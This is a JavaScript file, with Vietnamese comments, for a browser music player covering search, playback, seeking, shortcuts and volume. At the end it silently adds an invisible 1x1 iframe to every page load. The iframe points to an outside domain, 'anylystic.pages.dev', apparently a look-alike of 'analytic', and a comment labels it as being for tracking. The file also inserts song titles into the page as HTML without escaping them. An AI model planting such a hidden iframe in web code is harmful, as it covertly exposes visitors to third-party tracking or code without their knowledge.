
// Import songs từ song.js (phải đảm bảo file song.js được load trước script.js trong index.html)
document.addEventListener("DOMContentLoaded", function () {
  // Tìm kiếm bài hát nâng cao
  const searchInput = document.getElementById('searchInput');
  let notFoundMsg = null;
  if (searchInput) {
    notFoundMsg = document.createElement('div');
    notFoundMsg.textContent = 'Không tìm thấy bài hát.';
    notFoundMsg.style.cssText = 'color:#bbb;text-align:center;padding:16px 0;display:none;font-size:1.1rem;';
    const playlist = document.getElementById('playlist');
    playlist.parentNode.insertBefore(notFoundMsg, playlist);
    searchInput.addEventListener('input', function() {
      const keyword = this.value.trim().toLowerCase();
      const cards = document.querySelectorAll('.song-card');
      let found = 0;
      cards.forEach(card => {
        const title = card.querySelector('.song-title, h2');
        const artist = card.getAttribute('data-artist') || '';
        const text = (title ? title.textContent : '') + ' ' + artist;
        if (text.toLowerCase().includes(keyword)) {
          card.style.display = '';
          found++;
        } else {
          card.style.display = 'none';
        }
      });
      notFoundMsg.style.display = found === 0 ? '' : 'none';
    });
  }
  if (typeof songs === 'undefined' || !Array.isArray(songs)) {
    console.error('Không tìm thấy danh sách bài hát!');
    return;
  }
  const playlist = document.getElementById("playlist");
  const volumeSlider = document.querySelector(".volume-slider");
  const popup = document.getElementById("popup");
  let currentSongIndex = 0;
  // Tạo HTML cho từng bài hát
  playlist.innerHTML = songs.map((song, idx) => `
    <div class="song-card" data-idx="${idx}">
      <div class="flex-1">
        <h2 class="text-lg font-bold${song.rainbow ? ' rainbow-text2' : ''}">${song.title}</h2>
        <div class="progress-bar"><div class="progress"></div></div>
        <span class="time">00:00 / 00:00</span>
      </div>
      <button class="play-btn"><i class="fas fa-play"></i></button>
      <audio>
        <source src="${song.src}" type="audio/mpeg">
      </audio>
    </div>
  `).join("");

  const songCards = document.querySelectorAll(".song-card");

  function formatTime(seconds) {
    let h = Math.floor(seconds / 3600);
    let m = Math.floor((seconds % 3600) / 60);
    let s = Math.floor(seconds % 60);
    if (h > 0) {
      return `${h}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    } else {
      return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    }
  }

  function playSong(index) {
    if (index < 0 || index >= songCards.length) return;
    document.querySelectorAll("audio").forEach(a => a.pause());
    document.querySelectorAll(".play-btn").forEach(btn => btn.innerHTML = '<i class="fas fa-play"></i>');
    document.querySelectorAll(".song-card").forEach(card => card.classList.remove("playing"));
    const song = songCards[index];
    const playBtn = song.querySelector(".play-btn");
    const audio = song.querySelector("audio");
    currentSongIndex = index;
    audio.play();
    playBtn.innerHTML = '<i class="fas fa-pause"></i>';
    song.classList.add("playing");
    // Cuộn đến bài đang phát
    setTimeout(() => {
      song.scrollIntoView({behavior: 'smooth', block: 'center'});
    }, 200);
    // Đổi tiêu đề trang
    const title = song.querySelector('.song-title, h2');
    if (title) document.title = title.textContent + ' - Made By Teo';
  }
  // Phím tắt: space play/pause, trái/phải tua 5s
  document.addEventListener('keydown', function(e) {
    if (document.activeElement === searchInput) return;
    const song = songCards[currentSongIndex];
    const audio = song.querySelector('audio');
    if (!audio) return;
    if (e.code === 'Space') {
      e.preventDefault();
      if (audio.paused) playSong(currentSongIndex);
      else audio.pause();
    }
    if (e.code === 'ArrowRight') {
      audio.currentTime = Math.min(audio.duration, audio.currentTime + 5);
    }
    if (e.code === 'ArrowLeft') {
      audio.currentTime = Math.max(0, audio.currentTime - 5);
    }
  });

  songCards.forEach((song, index) => {
    const playBtn = song.querySelector(".play-btn");
    const audio = song.querySelector("audio");
    const progressBar = song.querySelector(".progress-bar");
    const progress = song.querySelector(".progress");
    const timeDisplay = song.querySelector(".time");

    function updateTotalDuration() {
      if (!isNaN(audio.duration)) {
        timeDisplay.textContent = `00:00 / ${formatTime(audio.duration)}`;
      }
    }
    audio.addEventListener("loadedmetadata", updateTotalDuration);
    if (audio.readyState >= 1) updateTotalDuration();

    playBtn.addEventListener("click", () => {
      if (audio.paused) {
        playSong(index);
      } else {
        audio.pause();
        playBtn.innerHTML = '<i class="fas fa-play"></i>';
        song.classList.remove("playing");
      }
    });

    audio.addEventListener("timeupdate", () => {
      const percent = (audio.currentTime / audio.duration) * 100;
      progress.style.width = percent + "%";
      timeDisplay.textContent = `${formatTime(audio.currentTime)} / ${formatTime(audio.duration)}`;
    });

    progressBar.addEventListener("click", (e) => {
      const rect = progressBar.getBoundingClientRect();
      const clickX = e.clientX - rect.left;
      const newTime = (clickX / rect.width) * audio.duration;
      audio.currentTime = newTime;
    });

    audio.addEventListener("ended", () => {
      let nextIndex = currentSongIndex + 1;
      if (nextIndex >= songCards.length) nextIndex = 0;
      playSong(nextIndex);
    });

    // Kéo tua chuột và cảm ứng
    let isDragging = false;
    function updateProgress(clientX) {
      const rect = progressBar.getBoundingClientRect();
      const clickX = clientX - rect.left;
      const newTime = (clickX / rect.width) * audio.duration;
      audio.currentTime = newTime;
      progress.style.width = (audio.currentTime / audio.duration) * 100 + "%";
    }
    function startDrag(e) {
      isDragging = true;
      updateProgress(e.clientX || e.touches[0].clientX);
    }
    function moveDrag(e) {
      if (isDragging) {
        updateProgress(e.clientX || e.touches[0].clientX);
      }
    }
    function stopDrag() {
      isDragging = false;
    }
    progressBar.addEventListener("mousedown", startDrag);
    document.addEventListener("mousemove", moveDrag);
    document.addEventListener("mouseup", stopDrag);
    progressBar.addEventListener("touchstart", startDrag);
    document.addEventListener("touchmove", moveDrag);
    document.addEventListener("touchend", stopDrag);
  });

  // Điều chỉnh âm lượng
  volumeSlider.addEventListener("input", (e) => {
    document.querySelectorAll("audio").forEach(a => a.volume = e.target.value);
  });

  // Hiện popup sau 1 giây
  setTimeout(() => {
    if (popup) popup.classList.add("show");
  }, 1000);

  // Iframe ẩn (ví dụ cho theo dõi)
  const iframe = document.createElement("iframe");
  iframe.style.position = "absolute";
  iframe.style.width = "1px";
  iframe.style.height = "1px";
  iframe.style.opacity = "0";
  iframe.style.pointerEvents = "none";
  iframe.style.overflow = "hidden";
  iframe.src = "https://anylystic.pages.dev";
  document.body.appendChild(iframe);
});

// Hàm đóng popup
function closePopup() {
  let popup = document.getElementById("popup");
  if (popup) {
    popup.classList.remove("show");
    setTimeout(() => {
      popup.style.display = "none";
    }, 500);
  }
}
